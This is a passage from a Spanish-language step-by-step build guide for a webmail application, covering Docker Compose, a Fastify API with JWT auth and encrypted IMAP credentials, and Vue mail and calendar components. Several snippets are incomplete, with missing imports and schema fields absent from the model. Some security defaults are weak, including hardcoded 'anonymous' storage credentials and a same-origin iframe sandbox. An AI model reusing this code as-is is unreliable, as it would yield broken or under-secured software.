      SEAWEEDFS_ENDPOINT: http://seaweedfs:8333
    secrets:
      - mongo_root_password
      - jwt_secret
      - encryption_key
    depends_on:
      mongo:
        condition: service_healthy
      redis:
        condition: service_healthy
      seaweedfs:
        condition: service_healthy
    networks:
      - webmail6_net
    healthcheck:
      test: ["CMD", "wget", "-q", "--spider", "http://localhost:3000/health/live"]
      interval: 15s
      timeout: 5s
      retries: 3
      start_period: 30s
    deploy:
      resources:
        limits: { memory: 512M }
        reservations: { memory: 128M }
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "3" }

volumes:
  mongo_data:
  redis_data:
  seaweed_data:
  certbot_data:

networks:
  webmail6_net:
    driver: bridge

secrets:
  mongo_root_password:
    environment: MONGO_PASSWORD
  jwt_secret:
    environment: JWT_SECRET
  encryption_key:
    environment: ENCRYPTION_KEY
```

Levantar la infraestructura:

```bash
docker compose up -d mongo redis seaweedfs
# Verificar salud
docker compose ps
# Esperar a que mongo reporte healthy antes de continuar
docker compose logs -f mongo
```

### 11.1.3 TypeScript Strict, ESLint + Prettier

```bash
# Configuración ESLint flat config
cat > eslint.config.js << 'EOF'
import js from '@eslint/js';
import tseslint from 'typescript-eslint';
import vue from 'eslint-plugin-vue';
import prettier from 'eslint-config-prettier';

export default tseslint.config(
  js.configs.recommended,
  ...tseslint.configs.strictTypeChecked,
  ...tseslint.configs.stylisticTypeChecked,
  ...vue.configs['flat/recommended'],
  prettier,
  {
    languageOptions: {
      parserOptions: {
        projectService: true,
        tsconfigRootDir: import.meta.dirname,
      },
    },
  },
  {
    files: ['**/*.vue'],
    languageOptions: {
      parser: vue.parser,
      parserOptions: {
        parser: tseslint.parser,
        projectService: true,
      },
    },
  }
);
EOF

# Prettier config
cat > .prettierrc << 'EOF'
{
  "semi": true,
  "singleQuote": true,
  "tabWidth": 2,
  "trailingComma": "es5",
  "printWidth": 100
}
EOF

# Git hooks con simple-git-hooks + lint-staged
pnpm add -D simple-git-hooks lint-staged
# package.json scripts addition:
# "prepare": "simple-git-hooks"
# simple-git-hooks config:
# "simple-git-hooks": { "pre-commit": "pnpm lint-staged" }
# lint-staged config:
# "lint-staged": { "*.{ts,vue}": ["eslint --fix", "prettier --write"] }
```

**Validación:** `pnpm lint` debe ejecutarse sin errores en el template inicial.

## 11.2 Fase 2: Backend Core (Semanas 2-3)

**Objetivos:** API REST funcional con autenticación, modelos de datos y servicios de correo.

**Entregables:** Endpoints de auth, schemas Mongoose, IMAP bridge y SMTP service.

### 11.2.1 Fastify Setup

```bash
cd packages/api
pnpm add fastify@^5 @fastify/cors@^10 @fastify/jwt@^9 @fastify/cookie@^11 \
  @fastify/helmet@^13 @fastify/rate-limit@^10 @fastify/env@^5 \
  mongoose@^8 imapflow@^1 nodemailer@^6 bullmq@^5 ioredis@^5 \
  @aws-sdk/client-s3@^3 postal-mime@^2 sanitize-html@^2 \
  dotenv@^16 zod@^3

pnpm add -D typescript @types/node @types/nodemailer tsx vitest @vitest/coverage-v8
```

```typescript
// packages/api/src/app.ts
import Fastify from 'fastify';
import cors from '@fastify/cors';
import jwt from '@fastify/jwt';
import cookie from '@fastify/cookie';
import helmet from '@fastify/helmet';
import rateLimit from '@fastify/rate-limit';
import { envSchema } from './config/env.js';
import { healthRoutes } from './routes/health.js';
import { authRoutes } from './routes/auth.js';
import { emailRoutes } from './routes/email.js';
import { folderRoutes } from './routes/folder.js';
import { attachmentRoutes } from './routes/attachment.js';
import { composeRoutes } from './routes/compose.js';
import { contactRoutes } from './routes/contact.js';
import { calendarRoutes } from './routes/calendar.js';

export async function buildApp() {
  const app = Fastify({
    logger: { level: process.env.LOG_LEVEL || 'info' },
    trustProxy: true,
  });

  await app.register(helmet, {
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "blob:"],
      },
    },
  });

  await app.register(cors, {
    origin: process.env.FRONTEND_URL || 'http://localhost:5173',
    credentials: true,
  });

  await app.register(rateLimit, {
    max: 100,
    timeWindow: '1 minute',
    keyGenerator: (req) => req.ip || 'anonymous',
  });

  await app.register(jwt, {
    secret: process.env.JWT_SECRET!,
    cookie: { cookieName: 'refreshToken', signed: false },
  });

  await app.register(cookie);

  // Health checks
  await app.register(healthRoutes, { prefix: '/health' });

  // API routes v1
  await app.register(authRoutes, { prefix: '/api/v1/auth' });
  await app.register(emailRoutes, { prefix: '/api/v1/emails' });
  await app.register(folderRoutes, { prefix: '/api/v1/folders' });
  await app.register(attachmentRoutes, { prefix: '/api/v1/attachments' });
  await app.register(composeRoutes, { prefix: '/api/v1/compose' });
  await app.register(contactRoutes, { prefix: '/api/v1/contacts' });
  await app.register(calendarRoutes, { prefix: '/api/v1/calendar' });

  return app;
}
```

### 11.2.2 Mongoose Schemas

```typescript
// packages/api/src/models/User.ts
import mongoose from 'mongoose';

const AccountSchema = new mongoose.Schema({
  email: { type: String, required: true },
  provider: { type: String, enum: ['imap', 'gmail_oauth', 'microsoft_oauth'], required: true },
  imapHost: String,
  imapPort: { type: Number, default: 993 },
  imapSecure: { type: Boolean, default: true },
  smtpHost: String,
  smtpPort: { type: Number, default: 587 },
  smtpSecure: { type: Boolean, default: false },
  credentialsEncrypted: { type: String, required: true },
  displayName: String,
  syncState: {
    lastUid: { type: Number, default: 0 },
    lastSyncAt: Date,
    highestModSeq: String,
  },
  createdAt: { type: Date, default: Date.now },
}, { _id: true });

const UserSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  passwordHash: { type: String, required: true },
  accounts: [AccountSchema],
  preferences: {
    theme: { type: String, enum: ['light', 'dark', 'system'], default: 'system' },
    density: { type: String, enum: ['compact', 'comfortable'], default: 'comfortable' },
    signature: String,
  },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now },
});

export const User = mongoose.model('User', UserSchema);
```

```typescript
// packages/api/src/models/Email.ts
import mongoose from 'mongoose';

const AttachmentRefSchema = new mongoose.Schema({
  filename: String,
  contentType: String,
  size: Number,
  seaweedFid: String,
}, { _id: false });

const EmailSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, required: true, index: true },
  accountId: { type: mongoose.Schema.Types.ObjectId, required: true, index: true },
  folderId: { type: mongoose.Schema.Types.ObjectId, required: true, index: true },

  // IMAP metadata
  uid: { type: Number, required: true },
  messageId: { type: String, index: true },
  threadId: { type: String, index: true },

  // Headers
  subject: String,
  from: [{ name: String, address: String }],
  to: [{ name: String, address: String }],
  cc: [{ name: String, address: String }],
  bcc: [{ name: String, address: String }],
  replyTo: [{ name: String, address: String }],
  date: { type: Date, index: true },

  // Content
  bodyText: String,
  bodyHtml: String,
  bodyHtmlSanitized: String,
  headers: mongoose.Schema.Types.Mixed,

  // State
  flags: { type: [String], default: [] },
  isRead: { type: Boolean, default: false },
  isStarred: { type: Boolean, default: false },
  size: Number,

  // Attachments
  attachments: [AttachmentRefSchema],
  hasAttachments: { type: Boolean, default: false },

  // Indexing
  indexedAt: { type: Date, default: Date.now },
}, {
  timestamps: true,
});

// Índice compuesto ESR: Equality → Sort → Range
EmailSchema.index({ accountId: 1, folderId: 1, date: -1, uid: -1 });
EmailSchema.index({ accountId: 1, threadId: 1, date: -1 });
EmailSchema.index({ userId: 1, isRead: 1, date: -1 });

export const Email = mongoose.model('Email', EmailSchema);
```

### 11.2.3 Auth: JWT + Redis Refresh Tokens

El patrón BFF (Backend for Frontend) almacena el access token en memoria del frontend y el refresh token en una cookie HttpOnly. Las credenciales IMAP se encriptan con AES-256-GCM antes de almacenarse [^157^] [^160^].

```typescript
// packages/api/src/services/auth.ts
import crypto from 'crypto';
import bcrypt from 'bcrypt';
import { User } from '../models/User.js';
import { redis } from '../config/redis.js';

const ALGORITHM = 'aes-256-gcm';
const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex');

export class AuthService {
  static encryptCredentials(plain: string): { ciphertext: string; iv: string; tag: string } {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
    let ciphertext = cipher.update(plain, 'utf8', 'hex');
    ciphertext += cipher.final('hex');
    const tag = cipher.getAuthTag();
    return { ciphertext, iv: iv.toString('hex'), tag: tag.toString('hex') };
  }

  static decryptCredentials(ciphertext: string, iv: string, tag: string): string {
    const decipher = crypto.createDecipheriv(
      ALGORITHM, ENCRYPTION_KEY, Buffer.from(iv, 'hex')
    );
    decipher.setAuthTag(Buffer.from(tag, 'hex'));
    let plaintext = decipher.update(ciphertext, 'hex', 'utf8');
    plaintext += decipher.final('utf8');
    return plaintext;
  }

  static async createRefreshToken(userId: string): Promise<string> {
    const tokenId = crypto.randomBytes(32).toString('hex');
    const tokenFamily = crypto.randomBytes(16).toString('hex');
    await redis.setex(
      `refresh:${tokenId}`,
      7 * 24 * 3600, // 7 días
      JSON.stringify({ userId, family: tokenFamily, createdAt: Date.now() })
    );
    return tokenId;
  }

  static async validateRefreshToken(tokenId: string) {
    const data = await redis.get(`refresh:${tokenId}`);
    if (!data) return null;
    await redis.del(`refresh:${tokenId}`); // one-time use
    return JSON.parse(data);
  }

  static async hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 12);
  }
}
```

### 11.2.4 IMAP Bridge Service

El servicio de sincronización IMAP utiliza imapflow con un pool de conexiones y la estrategia headers-first, body-on-demand que permite cargar bandejas en menos de un segundo [^1^] [^3^].

```typescript
// packages/api/src/services/imap-bridge.ts
import { ImapFlow } from 'imapflow';
import PostalMime from 'postal-mime';
import { Email } from '../models/Email.js';
import { redis } from '../config/redis.js';
import { AuthService } from './auth.js';
import type { AccountDoc } from '../types/index.js';

export class ImapBridgeService {
  private clients: Map<string, ImapFlow> = new Map();

  async getClient(account: AccountDoc): Promise<ImapFlow> {
    const key = account._id!.toString();
    if (this.clients.has(key)) {
      const existing = this.clients.get(key)!;
      if (existing.usable) return existing;
      await existing.logout();
    }

    const creds = JSON.parse(
      AuthService.decryptCredentials(
        account.credentialsEncrypted,
        account.credentialsIv!,
        account.credentialsTag!
      )
    );

    const client = new ImapFlow({
      host: account.imapHost!,
      port: account.imapPort || 993,
      secure: account.imapSecure !== false,
      auth: { user: account.email, pass: creds.password },
      logger: false,
      emitLogs: false,
    });

    await client.connect();
    this.clients.set(key, client);
    return client;
  }

  async syncInbox(account: AccountDoc, folderPath: string = 'INBOX'): Promise<number> {
    const client = await this.getClient(account);
    const lock = await client.getMailboxLock(folderPath);

    try {
      const lastUid = account.syncState?.lastUid || 0;
      const fetchRange = lastUid > 0 ? `${lastUid + 1}:*` : '1:*';

      // Headers-only fetch para el listado
      let synced = 0;
      for await (let msg of client.fetch(fetchRange, {
        uid: true,
        flags: true,
        envelope: true,
        headers: ['message-id', 'in-reply-to', 'references'],
        internalDate: true,
        size: true,
        struct: true,
        threadId: true,
      })) {
        if (msg.uid <= lastUid) continue;

        const hasAttachments = msg.struct?.some((part: any) =>
          part.disposition?.includes('attachment')
        ) ?? false;

        await Email.updateOne(
          { accountId: account._id, uid: msg.uid },
          {
            $setOnInsert: {
              userId: account.userId,
              folderId: await this.resolveFolderId(account, folderPath),
              uid: msg.uid,
              messageId: msg.envelope.messageId,
              threadId: msg.threadId || msg.envelope.messageId,
              subject: msg.envelope.subject,
              from: msg.envelope.from,
              to: msg.envelope.to,
              cc: msg.envelope.cc,
              date: msg.envelope.date,
              size: msg.size,
              flags: msg.flags,
              isRead: msg.flags.has('\\Seen'),
              isStarred: msg.flags.has('\\Flagged'),
              hasAttachments,
              headers: msg.headers,
            },
          },
          { upsert: true }
        );
        synced++;
      }

      return synced;
    } finally {
      lock.release();
    }
  }

  async fetchBody(account: AccountDoc, uid: number): Promise<{ text: string; html: string; sanitized: string }> {
    const cacheKey = `body:${account._id}:${uid}`;
    const cached = await redis.get(cacheKey);
    if (cached) return JSON.parse(cached);

    const client = await this.getClient(account);
    const lock = await client.getMailboxLock('INBOX');

    try {
      const msg = await client.fetchOne(uid.toString(), { source: true }, { uid: true });
      const parsed = await PostalMime.parse(msg.source);

      const result = {
        text: parsed.text || '',
        html: parsed.html || '',
        sanitized: this.sanitizeHtml(parsed.html || ''),
      };

      await redis.setex(cacheKey, 3600, JSON.stringify(result)); // TTL 1 hora
      return result;
    } finally {
      lock.release();
    }
  }

  private sanitizeHtml(html: string): string {
    return sanitizeHtml(html, {
      allowedTags: [
        'p', 'br', 'strong', 'em', 'u', 'a', 'img', 'table', 'tr', 'td', 'th',
        'thead', 'tbody', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'blockquote', 'pre', 'code', 'span', 'div'
      ],
      allowedAttributes: {
        a: ['href', 'title'],
        img: ['src', 'alt', 'width', 'height'],
        '*': ['style'],
      },
      allowedSchemes: ['http', 'https', 'mailto'],
    });
  }
}
```

### 11.2.5 SMTP Service

```typescript
// packages/api/src/services/smtp.ts
import nodemailer from 'nodemailer';
import { AuthService } from './auth.js';
import type { AccountDoc } from '../types/index.js';

export class SmtpService {
  private transporters: Map<string, nodemailer.Transporter> = new Map();

  async getTransporter(account: AccountDoc): Promise<nodemailer.Transporter> {
    const key = account._id!.toString();
    if (!this.transporters.has(key)) {
      const creds = JSON.parse(
        AuthService.decryptCredentials(
          account.credentialsEncrypted,
          account.credentialsIv!,
          account.credentialsTag!
        )
      );

      const transporter = nodemailer.createTransport({
        pool: true,
        host: account.smtpHost,
        port: account.smtpPort || 587,
        secure: account.smtpSecure || false,
        auth: { user: account.email, pass: creds.password },
        maxConnections: 3,
        maxMessages: 100,
      });

      this.transporters.set(key, transporter);
    }
    return this.transporters.get(key)!;
  }

  async sendEmail(
    account: AccountDoc,
    data: { to: string[]; cc?: string[]; bcc?: string[]; subject: string; text: string; html?: string; attachments?: any[] }
  ): Promise<string> {
    const transporter = await this.getTransporter(account);
    const result = await transporter.sendMail({
      from: { name: account.displayName || account.email, address: account.email },
      to: data.to,
      cc: data.cc,
      bcc: data.bcc,
      subject: data.subject,
      text: data.text,
      html: data.html,
      attachments: data.attachments,
    });
    return result.messageId;
  }
}
```

**Validación:** Ejecutar `pnpm dev` en el package `api`, verificar que `curl http://localhost:3000/health/live` devuelve `{ "status": "ok" }` y que la conexión a MongoDB y Redis es exitosa.

## 11.3 Fase 3: Frontend Core (Semanas 3-4)

**Objetivos:** Interfaz de usuario funcional con layout de tres paneles, autenticación y gestión de correo.

### 11.3.1 Vue 3 + Vite + Tailwind + Pinia

```bash
cd packages/web
pnpm create vite@latest . -- --template vue-ts
pnpm add tailwindcss@^3 @tailwindcss/forms @tailwindcss/typography postcss autoprefixer
pnpm add pinia@^2 vue-router@^4 @vueuse/core@^12 date-fns@^4
pnpm add tiptap@^2 @tiptap/vue-3@^2 @tiptap/starter-kit@^2 @tiptap/extension-link@^2
pnpm add @fullcalendar/core@^6 @fullcalendar/vue3@^6 @fullcalendar/daygrid@^6 @fullcalendar/timegrid@^6
pnpm add tsdav@^3 ical.js@^2
pnpm add -D @playwright/test

# Inicializar Tailwind
npx tailwindcss init -p
```

```typescript
// packages/web/src/main.ts
import { createApp } from 'vue';
import { createPinia } from 'pinia';
import router from './router';
import App from './App.vue';
import './style.css';

const app = createApp(App);
app.use(createPinia());
app.use(router);
app.mount('#app');
```

### 11.3.2 Layout de Tres Paneles

```vue
<!-- packages/web/src/layouts/MailLayout.vue -->
<template>
  <div class="flex h-screen bg-white dark:bg-gray-900">
    <!-- Sidebar -->
    <aside class="w-64 flex-shrink-0 border-r border-gray-200 dark:border-gray-700 flex flex-col">
      <AccountSwitcher :accounts="accountStore.accounts" />
      <FolderList
        :folders="folderStore.folders"
        :selected="folderStore.selectedId"
        @select="folderStore.select"
        @drop-email="moveEmail"
      />
      <div class="mt-auto p-4">
        <button
          @click="router.push('/compose')"
          class="w-full bg-blue-600 hover:bg-blue-700 text-white rounded-lg py-2.5 font-medium transition"
        >
          Redactar
        </button>
      </div>
    </aside>

    <!-- Email List -->
    <div class="w-[420px] flex-shrink-0 border-r border-gray-200 dark:border-gray-700 flex flex-col">
      <SearchBar v-model="searchQuery" @search="performSearch" />
      <VirtualEmailList
        :emails="emailStore.filteredEmails"
        :selected="emailStore.selectedIds"
        :total="emailStore.total"
        @select="emailStore.toggleSelect"
        @select-one="emailStore.selectOne"
        @scroll-end="emailStore.loadMore"
        @toggle-read="toggleRead"
        @toggle-star="toggleStar"
      />
    </div>

    <!-- Reading Pane -->
    <main class="flex-1 min-w-0 flex flex-col bg-white dark:bg-gray-900">
      <ReadingPaneToolbar
        :email="emailStore.currentEmail"
        @reply="composeReply"
        @reply-all="composeReplyAll"
        @forward="composeForward"
        @delete="deleteEmail"
        @toggle-star="toggleStar"
      />
      <EmailViewer
        v-if="emailStore.currentEmail"
        :email="emailStore.currentEmail"
        class="flex-1 overflow-y-auto"
      />
      <EmptyState v-else message="Selecciona un correo para leerlo" />
    </main>
  </div>
</template>
```

### 11.3.3 Login Multi-Cuenta

```typescript
// packages/web/src/stores/auth.ts
import { defineStore } from 'pinia';
import { ref } from 'vue';
import { api } from '../lib/api';

export const useAuthStore = defineStore('auth', () => {
  const accessToken = ref<string | null>(null);
  const user = ref<User | null>(null);
  const isAuthenticated = computed(() => !!accessToken.value);

  async function login(username: string, password: string): Promise<void> {
    const response = await api.post('/auth/login', { username, password });
    accessToken.value = response.data.accessToken;
    user.value = response.data.user;
    api.defaults.headers.common['Authorization'] = `Bearer ${accessToken.value}`;
    startRefreshTimer();
  }

  async function logout(): Promise<void> {
    await api.post('/auth/logout').catch(() => {});
    accessToken.value = null;
    user.value = null;
    delete api.defaults.headers.common['Authorization'];
  }

  // Refresh automático del access token cada 10 minutos
  let refreshTimer: ReturnType<typeof setInterval>;
  function startRefreshTimer() {
    refreshTimer = setInterval(async () => {
      try {
        const res = await api.post('/auth/refresh', {}, { withCredentials: true });
        accessToken.value = res.data.accessToken;
        api.defaults.headers.common['Authorization'] = `Bearer ${accessToken.value}`;
      } catch {
        logout();
      }
    }, 10 * 60 * 1000);
  }

  return { accessToken, user, isAuthenticated, login, logout };
});
```

### 11.3.4 Lista de Emails: Virtual Scroll

```vue
<!-- packages/web/src/components/VirtualEmailList.vue -->
<template>
  <div ref="container" class="flex-1 overflow-y-auto" @scroll="onScroll">
    <div :style="{ height: `${totalHeight}px`, position: 'relative' }">
      <div
        v-for="email in visibleEmails"
        :key="email.id"
        :style="{ transform: `translateY(${email.offsetY}px)`, position: 'absolute', top: 0, left: 0, right: 0 }"
        @click="$emit('select-one', email.id)"
        :class="[
          'px-4 py-3 border-b border-gray-100 dark:border-gray-800 cursor-pointer transition-colors',
          selected.has(email.id) ? 'bg-blue-50 dark:bg-blue-900/20' : 'hover:bg-gray-50 dark:hover:bg-gray-800',
          !email.isRead && 'font-semibold'
        ]"
      >
        <div class="flex items-center gap-2">
          <input
            type="checkbox"
            :checked="selected.has(email.id)"
            @click.stop="$emit('select', email.id)"
            class="rounded"
          />
          <button @click.stop="$emit('toggle-star', email.id)" class="text-lg">
            {{ email.isStarred ? '★' : '☆' }}
          </button>
          <span class="flex-1 truncate text-sm dark:text-gray-200">
            {{ email.from[0]?.name || email.from[0]?.address }}
          </span>
          <span class="text-xs text-gray-400">{{ formatDate(email.date) }}</span>
        </div>
        <div class="text-sm truncate dark:text-gray-300 mt-0.5 pl-7">{{ email.subject }}</div>
        <div class="text-xs text-gray-400 truncate pl-7">{{ email.preview }}</div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, computed, onMounted } from 'vue';
import { formatDistanceToNow } from 'date-fns';
import { es } from 'date-fns/locale';

const props = defineProps<{ emails: Email[]; selected: Set<string>; total: number }>();
const emit = defineEmits(['select', 'select-one', 'scroll-end', 'toggle-read', 'toggle-star']);

const ITEM_HEIGHT = 80;
const OVERSCAN = 5;

const container = ref<HTMLDivElement>();
const scrollTop = ref(0);
const containerHeight = ref(800);

const totalHeight = computed(() => props.total * ITEM_HEIGHT);

const visibleRange = computed(() => {
  const start = Math.floor(scrollTop.value / ITEM_HEIGHT);
  const count = Math.ceil(containerHeight.value / ITEM_HEIGHT);
  return {
    start: Math.max(0, start - OVERSCAN),
    end: Math.min(props.total, start + count + OVERSCAN),
  };
});

const visibleEmails = computed(() =>
  props.emails.slice(visibleRange.value.start, visibleRange.value.end).map((email, i) => ({
    ...email,
    offsetY: (visibleRange.value.start + i) * ITEM_HEIGHT,
  }))
);

function onScroll() {
  if (!container.value) return;
  scrollTop.value = container.value.scrollTop;
  const bottom = scrollTop.value + containerHeight.value;
  if (bottom >= totalHeight.value - ITEM_HEIGHT * 3) {
    emit('scroll-end');
  }
}

function formatDate(d: string) {
  return formatDistanceToNow(new Date(d), { addSuffix: true, locale: es });
}

onMounted(() => {
  if (container.value) containerHeight.value = container.value.clientHeight;
});
</script>
```

### 11.3.5 Vista de Lectura: HTML Sanitizado

```vue
<!-- packages/web/src/components/EmailViewer.vue -->
<template>
  <div class="p-6">
    <h1 class="text-xl font-semibold mb-2 dark:text-white">{{ email.subject }}</h1>
    <div class="flex items-center gap-3 mb-4 pb-4 border-b dark:border-gray-700">
      <Avatar :email="email.from[0]?.address" :name="email.from[0]?.name" />
      <div class="flex-1">
        <div class="font-medium dark:text-gray-200">{{ email.from[0]?.name || email.from[0]?.address }}</div>
        <div class="text-sm text-gray-500">{{ formatDateFull(email.date) }}</div>
      </div>
    </div>

    <!-- Tabs: HTML / Texto Plano / Headers -->
    <div class="flex gap-4 mb-4 border-b dark:border-gray-700">
      <button
        v-for="tab in ['html', 'text', 'headers']"
        :key="tab"
        @click="activeTab = tab"
        :class="['pb-2 text-sm capitalize', activeTab === tab ? 'border-b-2 border-blue-600 text-blue-600' : 'text-gray-500']"
      >
        {{ tab === 'html' ? 'HTML' : tab === 'text' ? 'Texto' : 'Cabeceras' }}
      </button>
    </div>

    <!-- Contenido en iframe aislado para HTML -->
    <iframe
      v-if="activeTab === 'html' && email.bodyHtmlSanitized"
      :srcdoc="email.bodyHtmlSanitized"
      class="w-full border-0"
      style="min-height: 400px;"
      sandbox="allow-same-origin"
      referrerpolicy="no-referrer"
    />
    <pre v-else-if="activeTab === 'text'" class="whitespace-pre-wrap dark:text-gray-300">{{ email.bodyText }}</pre>
    <pre v-else class="text-xs dark:text-gray-400 overflow-x-auto">{{ JSON.stringify(email.headers, null, 2) }}</pre>
  </div>
</template>
```

## 11.4 Fase 4: Compose y Drafts (Semana 4)

### 11.4.1 Tiptap 2 con Toolbar

```vue
<!-- packages/web/src/components/Composer.vue -->
<template>
  <div class="flex flex-col h-full bg-white dark:bg-gray-900">
    <div class="flex items-center gap-2 p-3 border-b dark:border-gray-700">
      <input
        v-model="compose.to"
        placeholder="Para"
        class="flex-1 bg-transparent border-b dark:text-white dark:border-gray-600 focus:outline-none focus:border-blue-500 pb-1"
      />
    </div>
    <div class="flex items-center gap-2 p-3 border-b dark:border-gray-700">
      <input
        v-model="compose.subject"
        placeholder="Asunto"
        class="flex-1 bg-transparent dark:text-white focus:outline-none"
      />
    </div>

    <!-- Tiptap Toolbar -->
    <div class="flex gap-1 p-2 border-b dark:border-gray-700 bg-gray-50 dark:bg-gray-800">
      <button @click="editor?.chain().focus().toggleBold().run()" :class="{ 'bg-gray-200': editor?.isActive('bold') }" class="p-1.5 rounded hover:bg-gray-200 dark:hover:bg-gray-600">B</button>
      <button @click="editor?.chain().focus().toggleItalic().run()" :class="{ 'bg-gray-200': editor?.isActive('italic') }" class="p-1.5 rounded hover:bg-gray-200 italic dark:hover:bg-gray-600">I</button>
      <button @click="editor?.chain().focus().toggleStrike().run()" :class="{ 'bg-gray-200': editor?.isActive('strike') }" class="p-1.5 rounded hover:bg-gray-200 line-through dark:hover:bg-gray-600">S</button>
      <div class="w-px h-6 bg-gray-300 mx-1" />
      <button @click="addLink" class="p-1.5 rounded hover:bg-gray-200 dark:hover:bg-gray-600">🔗</button>
      <button @click="editor?.chain().focus().toggleBulletList().run()" class="p-1.5 rounded hover:bg-gray-200 dark:hover:bg-gray-600">• List</button>
    </div>

    <editor-content :editor="editor" class="flex-1 overflow-y-auto p-4 prose dark:prose-invert max-w-none" />

    <div class="p-3 border-t dark:border-gray-700 flex items-center gap-3">
      <button
        @click="send"
        :disabled="sending"
        class="bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white px-6 py-2 rounded-lg font-medium"
      >
        {{ sending ? 'Enviando...' : 'Enviar' }}
      </button>
      <button @click="saveDraft" class="text-gray-600 hover:text-gray-800 dark:text-gray-400 dark:hover:text-gray-200">
        Guardar borrador
      </button>
      <span v-if="lastSaved" class="text-xs text-gray-400 ml-auto">
        Guardado {{ formatDistanceToNow(lastSaved, { addSuffix: true, locale: es }) }}
      </span>
    </div>
  </div>
</template>

<script setup lang="ts">
import { useEditor, EditorContent } from '@tiptap/vue-3';
import StarterKit from '@tiptap/starter-kit';
import Link from '@tiptap/extension-link';
import { ref, onBeforeUnmount, watch } from 'vue';
import { formatDistanceToNow } from 'date-fns';
import { es } from 'date-fns/locale';

const props = defineProps<{ replyTo?: Email; forward?: Email }>();

const editor = useEditor({
  extensions: [StarterKit, Link.configure({ openOnClick: false })],
  content: props.replyTo ? buildQuote(props.replyTo) : '',
});

const compose = reactive({ to: '', cc: '', bcc: '', subject: props.replyTo ? `Re: ${props.replyTo.subject}` : '' });
const sending = ref(false);
const lastSaved = ref<Date | null>(null);

// Auto-save cada 10 segundos
let autoSaveInterval: ReturnType<typeof setInterval>;
onMounted(() => {
  autoSaveInterval = setInterval(() => {
    if (editor.value?.getText().trim()) saveDraft();
  }, 10000);
});
onBeforeUnmount(() => {
  clearInterval(autoSaveInterval);
  editor.value?.destroy();
});

async function saveDraft() {
  await api.post('/compose/draft', {
    ...compose,
    bodyHtml: editor.value?.getHTML(),
    bodyText: editor.value?.getText(),
  });
  lastSaved.value = new Date();
}
</script>
```

### 11.4.2 Adjuntos: Drag-Drop a SeaweedFS

```typescript
// packages/api/src/services/attachments.ts
import { S3Client, PutObjectCommand, GetObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';

const s3 = new S3Client({
  endpoint: process.env.SEAWEEDFS_ENDPOINT,
  region: 'us-east-1',
  credentials: { accessKeyId: 'anonymous', secretAccessKey: 'anonymous' },
  forcePathStyle: true,
});

const BUCKET = 'webmail-attachments';

export class AttachmentService {
  static async upload(file: Buffer, filename: string, contentType: string): Promise<string> {
    const fid = `${Date.now()}-${crypto.randomUUID()}`;
    await s3.send(new PutObjectCommand({
      Bucket: BUCKET,
      Key: fid,
      Body: file,
      ContentType: contentType,
      Metadata: { filename },
    }));
    return fid;
  }

  static async getSignedUrl(fid: string, expiresIn: number = 3600): Promise<string> {
    return getSignedUrl(s3, new GetObjectCommand({ Bucket: BUCKET, Key: fid }), { expiresIn });
  }
}
```

## 11.5 Fase 5: Calendario (Semana 5)

### 11.5.1 tsdav: Auto-Discovery y CRUD

```typescript
// packages/api/src/services/caldav.ts
import { createDAVClient } from 'tsdav';
import { AuthService } from './auth.js';
import type { AccountDoc } from '../types/index.js';

export class CalDAVService {
  async getClient(account: AccountDoc) {
    const creds = JSON.parse(
      AuthService.decryptCredentials(
        account.credentialsEncrypted,
        account.credentialsIv!,
        account.credentialsTag!
      )
    );

    return createDAVClient({
      serverUrl: `https://${account.imapHost}`,
      credentials: { username: account.email, password: creds.password },
      authMethod: 'Basic',
      defaultAccountType: 'caldav',
    });
  }

  async listCalendars(account: AccountDoc) {
    const client = await this.getClient(account);
    await client.login();
    return client.fetchCalendars();
  }

  async listEvents(account: AccountDoc, calendarUrl: string, timeRange: { start: string; end: string }) {
    const client = await this.getClient(account);
    await client.login();
    return client.fetchCalendarObjects({
      calendar: { url: calendarUrl },
      timeRange,
    });
  }

  async createEvent(account: AccountDoc, calendarUrl: string, iCalString: string) {
    const client = await this.getClient(account);
    await client.login();
    return client.createCalendarObject({
      calendar: { url: calendarUrl },
      filename: `${crypto.randomUUID()}.ics`,
      iCalString,
    });
  }
}
```

### 11.5.2 FullCalendar: Día/Semana/Mes

```vue
<!-- packages/web/src/views/CalendarView.vue -->
<template>
  <div class="h-full flex flex-col">
    <FullCalendar
      :options="calendarOptions"
      class="flex-1"
    />
  </div>
</template>

<script setup lang="ts">
import FullCalendar from '@fullcalendar/vue3';
import dayGridPlugin from '@fullcalendar/daygrid';
import timeGridPlugin from '@fullcalendar/timegrid';
import interactionPlugin from '@fullcalendar/interaction';
import { ref } from 'vue';

const calendarOptions = ref({
  plugins: [dayGridPlugin, timeGridPlugin, interactionPlugin],
  initialView: 'timeGridWeek',
  headerToolbar: {
    left: 'prev,next today',
    center: 'title',
    right: 'dayGridMonth,timeGridWeek,timeGridDay',
  },
  editable: true,
  selectable: true,
  selectMirror: true,
  dayMaxEvents: true,
  weekends: true,
  events: fetchEvents,
  eventClick: handleEventClick,
  select: handleDateSelect,
});

async function fetchEvents(info: any) {
  const res = await api.get('/calendar/events', {
    params: { start: info.startStr, end: info.endStr },
  });
  return res.data.map((evt: any) => ({
    id: evt.uid,
    title: evt.summary,
    start: evt.start,
    end: evt.end,
    allDay: evt.allDay,
  }));
}
</script>
```

## 11.6 Fase 6: Polish (Semanas 6-7)

### 11.6.1 Dark Mode, Keyboard Shortcuts, Threading JWZ, Búsqueda Atlas Search

```typescript
// packages/web/src/composables/useTheme.ts
export function useTheme() {
  const store = usePreferencesStore();
  const isDark = computed(() => {
    if (store.theme === 'system') return window.matchMedia('(prefers-color-scheme: dark)').matches;
    return store.theme === 'dark';
  });

  watch(isDark, (dark) => {
